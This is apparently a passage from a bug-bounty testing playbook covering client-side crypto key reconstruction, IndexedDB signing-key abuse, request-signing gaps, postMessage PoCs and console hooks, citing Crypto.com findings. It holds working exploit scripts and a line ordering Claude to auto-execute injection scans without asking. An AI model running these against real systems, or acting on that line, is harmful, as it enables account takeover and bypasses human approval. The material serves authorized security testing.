**Auto-trigger:** JS bundles contain `PBKDF2`, `AES-KW`, `AES-GCM`, `AES-CBC`, `RSA-OAEP`, `ECDSA`, `ECDH`, `HKDF`, `crypto.subtle`, `SubtleCrypto`, `CryptoKey`, `importKey`, `deriveKey`, `unwrapKey`, `wrapKey`.

This is NOT "grep for API keys." This is tracing a multi-step cryptographic derivation from public constants to a working encryption/signing key.

### Procedure

```bash
F="evidence/web/js-bundles/all-bundles.js"

# Step 1: Find all WebCrypto operations
grep -oP 'crypto\.subtle\.\w+' "$F" | sort | uniq -c | sort -rn

# Step 2: Extract crypto constants
echo "=== PBKDF2 passwords/salts ==="
grep -oP '(?:password|salt|iterations|PBKDF2)["\s:=]+["\x27]([^"\x27]+)["\x27]' "$F"

echo "=== AES keys (wrapped or raw) ==="
grep -oP '["\x27]([a-f0-9]{48,96})["\x27]' "$F" | head -20

echo "=== Key derivation parameters ==="
grep -B5 -A5 'deriveKey\|unwrapKey\|importKey' "$F" | head -100

echo "=== Algorithm identifiers ==="
grep -oP 'name:\s*["\x27](AES-GCM|AES-KW|AES-CBC|PBKDF2|ECDSA|RSA-OAEP|HKDF|ECDH)["\x27]' "$F" | sort | uniq -c
```

### Step 3: Trace the full derivation chain

For each crypto operation found, trace the chain end-to-end:
```
1. What is the INPUT? (hardcoded constant? user input? server-provided?)
2. What transforms are applied? (PBKDF2 → AES-KW → AES-GCM is a 3-step chain)
3. What is the OUTPUT? (encryption key? signing key? MAC key?)
4. Is EVERY input to the chain public? (all in the bundle = fully reconstructible)
5. Can the output be reconstructed offline? (no server round-trip needed?)
```

### Step 4: Attempt key reconstruction in browser console

```javascript
// Template: reconstruct key from bundle constants
(async () => {
  const v = crypto.subtle, g = new TextEncoder();
  const hexToBuffer = h => {
    const b = new Uint8Array(h.length / 2);
    for (let i = 0; i < h.length; i += 2) b[i/2] = parseInt(h.substr(i,2), 16);
    return b.buffer;
  };
  const bufToHex = b => Array.from(new Uint8Array(b)).map(x => x.toString(16).padStart(2,'0')).join('');

  // Replace with extracted constants:
  const password = '<from_bundle>';
  const salt = '<hex_from_bundle>';
  const wrappedKey = '<hex_from_bundle>';
  const iterations = 100000; // from bundle

  const pbk = await v.importKey('raw', g.encode(password), 'PBKDF2', false, ['deriveKey']);
  const wk = await v.deriveKey(
    {name:'PBKDF2', salt:hexToBuffer(salt), iterations, hash:'SHA-256'},
    pbk, {name:'AES-KW', length:256}, true, ['unwrapKey']
  );
  const aesKey = await v.unwrapKey('raw', hexToBuffer(wrappedKey), wk, 'AES-KW', 'AES-GCM', true, ['encrypt','decrypt']);
  const raw = await v.exportKey('raw', aesKey);
  console.log('[KEY RECONSTRUCTED]', bufToHex(raw));
})();
```

### Step 5: Test against backend

Encrypt a test value with reconstructed key, send to backend. If backend decrypts without error → **key reconstruction CONFIRMED**. Save full request/response to evidence.

**Reference:** Crypto.com F-027 — PBKDF2(hardcoded password, hardcoded salt, 100000) → AES-KW unwrap → AES-GCM 256-bit key. All constants in public JS bundle. Reconstructed key accepted by backend on both og.com and web.crypto.com.

---

## 4.15 WebCrypto API / IndexedDB Key Exploitation

**Auto-trigger:** Target uses IndexedDB to store CryptoKey objects (common in apps with client-side signing or encryption).

`extractable: false` prevents `crypto.subtle.exportKey()`. It does NOT prevent `crypto.subtle.sign()`, `encrypt()`, or `decrypt()`. Any same-origin JavaScript can USE the key — just can't EXPORT it.

### Procedure

```javascript
// Step 1: Enumerate all IndexedDB databases
const dbs = await indexedDB.databases();
console.log('[INDEXEDDB] Databases:', dbs.map(d => d.name + ' v' + d.version));

// Step 2: For each database, enumerate object stores and find CryptoKey objects
for (const dbInfo of dbs) {
  const db = await new Promise((res, rej) => {
    const r = indexedDB.open(dbInfo.name);
    r.onsuccess = () => res(r.result);
    r.onerror = () => rej(r.error);
  });
  const stores = Array.from(db.objectStoreNames);
  for (const store of stores) {
    const tx = db.transaction(store, 'readonly');
    const entries = await new Promise((res, rej) => {
      const r = tx.objectStore(store).getAll();
      r.onsuccess = () => res(r.result);
      r.onerror = () => rej(r.error);
    });
    for (const entry of entries) {
      // Look for CryptoKey objects (privateKey, publicKey)
      if (entry?.key?.privateKey || entry?.privateKey) {
        const pk = entry.key?.privateKey || entry.privateKey;
        console.log('[CRYPTOKEY]', store, 'algorithm:', pk.algorithm, 'extractable:', pk.extractable, 'usages:', pk.usages);

        // Test signing — proves same-origin JS can sign despite extractable=false
        try {
          const sig = await crypto.subtle.sign(
            {name: pk.algorithm.name, hash: 'SHA-256'},
            pk,
            new TextEncoder().encode('test')
          );
          console.log('[SIGN WORKS]', sig.byteLength, 'bytes — same-origin JS can sign');
        } catch (e) {
          console.log('[SIGN FAILED]', e.message);
        }
      }
    }
  }
  db.close();
}
```

### Assessment

| Question | If YES |
|----------|--------|
| Can same-origin JS sign arbitrary data? | Document as capability for XSS chains |
| Can same-origin JS encrypt arbitrary data? | Test if backend accepts encrypted output |
| Is there CSP `script-src`? | If NO → any XSS = full key usage |
| Can the key be re-registered? | Device registration without old key = key replacement attack |

**Argument framing:** "extractable:false blocks key export. It does not block crypto.subtle.sign(). Any same-origin JS signs whatever it wants with the victim's registered key. Pick one: either this is a security control (and XSS breaks it) or it's not (and the operations it gates need server-side re-auth)."

**Reference:** Crypto.com F-027 — MonaDSA ECDSA P-256 key in IndexedDB `web-subtle` → `MyKeys`. extractable:false but crypto.subtle.sign() produced valid signatures. Backend accepted forged signatures on 6/8 protected endpoints.

---

## 4.16 Custom Request Signing Analysis

**Auto-trigger:** Target uses custom request signing headers (not standard Authorization: Bearer JWT). Examples: `X-MonaDSA`, `X-Signature`, `X-HMAC`, custom `Signature` header with non-standard format.

### Procedure

```bash
F="evidence/web/js-bundles/all-bundles.js"

# Step 1: Find signing-related code
grep -oP 'X-[A-Za-z]+-?(Signature|HMAC|DSA|Sign|Digest|Auth)["\s:]' "$F"
grep -B10 -A10 'crypto\.subtle\.sign\|ECDSA\|HMAC\|sign(' "$F" | head -200

# Step 2: Identify what gets signed
# Look for the data that's concatenated before signing:
grep -B20 'crypto\.subtle\.sign' "$F" | grep -oP 'method|path|url|body|timestamp|nonce|digest'
```

### Map signing scope

| Component | Signed? | Impact if NOT signed |
|-----------|---------|---------------------|
| HTTP method | ? | Signature from GET reusable for POST |
| URL path | ? | Signature from /safe reusable for /dangerous |
| Request body | ? | Body manipulation after signing |
| Timestamp | ? | Indefinite signature replay |
| Nonce | ? | Replay attack |
| Content-Type | ? | Content-type confusion |

### Authorization consistency: signing coverage

```bash
# Count endpoints requiring signing vs total
# If < 20% require signing → authorization consistency finding
echo "Total endpoints: $(wc -l < evidence/web/api-routes-extracted.txt)"
echo "Endpoints requiring signing: $(grep -c 'MonaDSA\|X-Signature\|signed' evidence/web/api-responses/authed-scan.txt)"
```

**Reference:** Crypto.com MonaDSA — signs body ONLY (no method, path, timestamp, nonce). 8/84 endpoints (9.5%) require signing. WC-019: DSA requirement inconsistency. WC-026: body-only signing = no replay protection.

---

## 4.17 PostMessage Handler Deep Analysis

**Auto-trigger:** JS bundles contain `addEventListener("message"` or `onmessage`.

### Step 1: Extract ALL handlers

```bash
F="evidence/web/js-bundles/all-bundles.js"

# Find all message event listeners
grep -n 'addEventListener.*message\|onmessage\s*=' "$F" | head -50

# Extract handler code blocks (context around each)
grep -B5 -A30 'addEventListener.*"message"' "$F" > evidence/web/postmessage-handlers.txt
```

### Step 2: Audit each handler

For EACH handler found:

| Question | Check |
|----------|-------|
| Origin check? | `event.origin`, `e.origin` validation before processing |
| Source check? | `event.source` validation |
| Data validation? | Schema/type checking on `event.data` |
| What API calls does it trigger? | Trace from handler to `fetch()` / `XMLHttpRequest` |
| Are attacker-controlled params in API calls? | `event.data.transaction_id`, `event.data.token`, etc. |
| Does it modify state? | localStorage, sessionStorage, React state, cache invalidation |

### Step 3: Build cross-origin PoC

```html
<!-- Template: Cross-origin postMessage PoC -->
<!DOCTYPE html>
<html>
<head><title>PostMessage Cross-Origin PoC</title></head>
<body>
<script>
var target = window.open('https://TARGET.com/page', 'target');
// Wait for page load, then send crafted message
setTimeout(function() {
  target.postMessage({
    source: 'HANDLER_SOURCE',
    status: 'success',
    transaction_id: 'ATTACKER_CONTROLLED_VALUE'
  }, 'https://TARGET.com');
  console.log('Sent cross-origin postMessage');
}, 3000);
</script>
</body>
</html>
```

### Step 4: Deploy console monitor and observe

Build a monitor script (see §4.19) that hooks `window.fetch` and `addEventListener("message")`. Inject into target console, then send cross-origin messages from PoC. If monitor shows `[FETCH]` entries triggered by `[CROSS-ORIGIN]` messages → **postMessage triggers authenticated API calls from attacker origin**.

**Reference:** Crypto.com WC-004 + WC-021: 7 postMessage handlers, 0 origin checks. Cross-origin `{source:"FiatWalletTopUp", status:"success", transaction_id:"ATTACKER_TX"}` triggered authenticated GET /fiat_wallets/transactions/{attacker_id} with victim's session cookies. WC-022: error 0002 from cross-origin triggered KYC token refresh → infinite loop.

---

## 4.18 Feature Flag / A-B Testing SDK Analysis

**Auto-trigger:** JS bundles contain GrowthBook, LaunchDarkly, Split, Optimizely, VWO, Amplitude Experiment, or similar.

### Procedure

```bash
F="evidence/web/js-bundles/all-bundles.js"

# Step 1: Detect SDK and extract key
grep -oP 'sdk-[a-zA-Z0-9]+' "$F"  # GrowthBook
grep -oP 'sdk_[a-f0-9]+' "$F"      # LaunchDarkly
grep -oP 'projectId["\s:]+["\x27]([a-f0-9]+)' "$F"  # Generic

# Step 2: Check for DOM mutation capabilities
grep -n '_applyDOMChanges\|innerHTML.*\.js\|visual.*editor\|dom.*changes\|inject.*script' "$F"

# Step 3: Check CORS on config endpoints
# GrowthBook SSE:
curl -sI "https://cdn.growthbook.io/sub/<SDK_KEY>" | grep -i access-control
# LaunchDarkly:
curl -sI "https://clientsdk.launchdarkly.com/sdk/evalx/<ENV_ID>/contexts" | grep -i access-control

# Step 4: Enumerate current flags/experiments
curl -s "https://cdn.growthbook.io/api/features/<SDK_KEY>" | jq '.features | keys'
```

### Assessment

| Signal | Risk |
|--------|------|
| `_applyDOMChanges` creates `<script>` via innerHTML | XSS via experiment injection |
| `access-control-allow-origin: *` on config endpoint | Any origin subscribes to flag updates |
| SDK dashboard compromise | Same-origin JS execution on target |
| CDN/DNS hijack of SDK domain | Script injection |
| Experiments with JS execution capability | Direct code injection vector |

**Reference:** Crypto.com WC-025 — GrowthBook SDK key `sdk-Fff1GTESgSQrtPqE`, `_applyDOMChanges` creates `<script>` via `innerHTML=e.js`, SSE endpoint `access-control-allow-origin: *` confirmed via curl. Combined with no CSP script-src = feature flag injection → same-origin XSS → full chain.

---

## 4.19 Console Runtime Monitoring

**When to build:** Deep Mode investigations where static bundle analysis is insufficient. Particularly useful for understanding postMessage→API chains, state management flows, and real-time data movement.

### Template: Universal Monitor Script

```javascript
(function(){
  var F=window.fetch, X=XMLHttpRequest.prototype.open, t=Date.now();
  function ts(){return "+"+(((Date.now()-t)/1000).toFixed(1))+"s"}

  // Hook postMessage reception
  window.addEventListener("message", function(e){
    var d = typeof e.data==="string" ? e.data : JSON.stringify(e.data);
    if(d.indexOf("webpack")>-1 || d.indexOf("REACT_DEV")>-1) return; // noise filter
    var cross = e.origin !== window.location.origin && e.origin !== "";
    console.log("["+(cross?"CROSS-ORIGIN":"SAME")+"] "+ts()+" origin="+e.origin);
    console.log("  data: "+d.substring(0,500));
  }, true);

  // Hook fetch
  window.fetch = function(){
    var u = typeof arguments[0]==="string" ? arguments[0] : (arguments[0]&&arguments[0].url)||"";
    var m = (arguments[1]&&arguments[1].method)||"GET";
    if(u.indexOf("/api/")>-1 || u.indexOf("/auth/")>-1){
      console.log("[FETCH] "+ts()+" "+m+" "+u);
      if(arguments[1]&&arguments[1].body){
        var b = typeof arguments[1].body==="string" ? arguments[1].body : "[non-string]";
        console.log("  body: "+b.substring(0,300));
      }
    }
    return F.apply(this, arguments);
  };

  // Hook XHR
  XMLHttpRequest.prototype.open = function(method, url){
    if(url && url.indexOf("/api/")>-1)
      console.log("[XHR] "+ts()+" "+method+" "+url);
    return X.apply(this, arguments);
  };

  // Hook localStorage writes
  var LS = localStorage.setItem;
  localStorage.setItem = function(k,v){
    console.log("[STORAGE] "+ts()+" setItem("+k+", "+String(v).substring(0,100)+")");
    return LS.call(this, k, v);
  };

  // Hook navigation
  var PS = history.pushState;
  history.pushState = function(){
    console.log("[NAV] "+ts()+" pushState -> "+arguments[2]);
    return PS.apply(this, arguments);
  };

  console.log("[MONITOR] Active — hooks: message, fetch, XHR, localStorage, pushState");
})()
```

### Usage
1. Open target page in browser (logged in)
2. Paste monitor script in console
3. Navigate through the application flows
4. Watch for: cross-origin messages triggering API calls, unexpected storage writes, navigation side effects
5. Save console output to `evidence/web/monitor-output-{flow}-{timestamp}.txt`

### Per-target customization
Add target-specific watchers:
```javascript
// Example: watch for specific API patterns
if(u.indexOf("fiat_wallets/transactions")>-1)
  console.log("  !!! CROSS-ORIGIN TRIGGER: fiat wallet transaction fetch !!!");
```

**Reference:** Crypto.com mon2.js — hooked fetch/XHR/localStorage/pushState/postMessage. Revealed that cross-origin postMessage triggered authenticated fetch to /fiat_wallets/transactions/ and /auth/tokens. Impossible to discover from static bundle analysis alone.

---

## 4.20 Cross-Asset Architecture Correlation

**Auto-trigger:** Target program has multiple web assets sharing codebase (e.g., og.com + web.crypto.com, app.protocol.com + beta.protocol.com).

### Procedure

```bash
# Step 1: Compare bundle structure
diff <(curl -s https://asset1.com/ | grep -oP 'src="[^"]*\.js"' | sort) \
     <(curl -s https://asset2.com/ | grep -oP 'src="[^"]*\.js"' | sort)

# Step 2: Compare CSP headers
curl -sI https://asset1.com/ | grep -i content-security
curl -sI https://asset2.com/ | grep -i content-security

# Step 3: Compare API proxy paths
# Are /api/proxy/private/app/* endpoints identical?

# Step 4: Compare crypto constants
# Same derivation, different values = same architecture, different keys
```

### Execution strategy

1. **Execute full chain on LOWER-value asset** (lower bounty tier)
   - Antiphishing changes, TOTP creation, safe state changes
   - Document confirmation signals (emails, visible state changes)
   - This becomes L3 (production-proven) evidence
2. **Validate architecture on HIGHER-value asset** — don't execute state changes
   - Key reconstruction: SUCCESS/FAIL
   - Backend acceptance of crypto primitives: YES/NO (e.g., "invalid_passcode" = crypto accepted, business logic reached)
   - MonaDSA/signing key access: YES/NO
3. **Document safety note** explaining why full chain wasn't executed on higher-value asset
4. **Submit under HIGHER-value asset** as primary, reference lower-value as proof

**Reference:** Crypto.com — full chain on og.com (antiphishing changed 3x, TOTP secret obtained, 6/8 endpoints forged). Architecture confirmed on web.crypto.com (key reconstruction SUCCESS, backend accepted forged passcode). Submitted under web.crypto.com ($2M scope) with og.com as production proof.

---

## 4.21 XSS Prerequisite Barrier Assessment

**When to use:** Finding requires XSS as prerequisite. Instead of just noting "requires XSS," systematically assess how high/low the barrier is.

### Barrier assessment checklist

| Factor | Low Barrier | High Barrier |
|--------|------------|-------------|
| CSP script-src | ABSENT | Strict nonce-based |
| SRI on external scripts | < 50% coverage | 100% coverage |
| External script count | > 10 without SRI | All with SRI |
| Feature flag SDK with DOM mutation | Present | Absent |
| Trusted Types | Not enforced | Enforced |
| innerHTML/dangerouslySetInnerHTML sinks | In application code | Only in framework |
| eval()/new Function() | Present | Absent |
| Reflected XSS potential | Endpoints reflect input | All sanitized |
| Framework XSS protection | Custom/none | React with strict mode |

### Scoring

Count LOW BARRIER factors:
- 0-2: "High XSS barrier — finding is theoretical" (be honest in IS NOT)
- 3-5: "Moderate barrier — standard web application attack surface"
- 6+: "Low barrier — multiple concurrent XSS enablers, none of the standard mitigations deployed"

Include the assessment in the report's attack scenario section with specific evidence (curl outputs, script counts, CSP headers).

**Reference:** Crypto.com F-027 — scored 7/9 low barrier factors: no CSP script-src, 34/35 scripts without SRI, GrowthBook DOM mutation with CORS *, no Trusted Types, no eval but not needed, React framework (moderate), multiple XSS enablers. Framed as "low barrier" with 4 concrete amplifying factors in report.

---

## Phase 4 Exit Checklist

- [ ] Every kill-gate-passed finding deeply analyzed
- [ ] All 24 auth vectors tested
- [ ] **MANDATORY: Authenticated session acquired and ALL bundle-extracted routes tested with token (§4.12)**
- [ ] **MANDATORY: Authorization consistency matrix built — security ops vs standard ops (§4.12)**
- [ ] **Notification suppression tested — can security alerts be silently disabled? (§4.12)**
- [ ] JS bundles downloaded and analyzed (30+ patterns)
- [ ] All API responses saved verbatim
- [ ] Smart contract math proofs constructed where applicable
- [ ] Infrastructure architecture mapped (incl. RPC, keepers, metadata)
- [ ] Cross-chain messaging validated if applicable (§4.7)
- [ ] Proxy upgrade chains fully resolved (§4.8)
- [ ] Supply chain dependencies audited (§4.10)
- [ ] **MANDATORY — CLAUDE AUTO-EXECUTES: Injection proxy bridge run for ALL exotic encodings (§4.13). Claude runs detect→profile→scan-all→report. Never ask, never skip.**
- [ ] **Client-side crypto chains traced end-to-end — key reconstruction attempted (§4.14)**
- [ ] **WebCrypto/IndexedDB keys enumerated — sign/encrypt capability tested (§4.15)**
- [ ] **Custom request signing scope mapped — signed vs unsigned components documented (§4.16)**
- [ ] **PostMessage handlers enumerated — origin checks audited, cross-origin PoC built (§4.17)**
- [ ] **Feature flag SDKs analyzed — DOM mutation capability, CORS on config endpoints (§4.18)**
- [ ] **Console monitor deployed for deep investigations — runtime behavior observed (§4.19)**
- [ ] **Cross-asset architecture compared if multiple assets in scope (§4.20)**
- [ ] **XSS barrier assessed if any finding requires XSS prerequisite (§4.21)**
- [ ] Evidence level updated for each finding
- [ ] Finding files updated with deep analysis results
- [ ] No "I'll check this later" items remaining
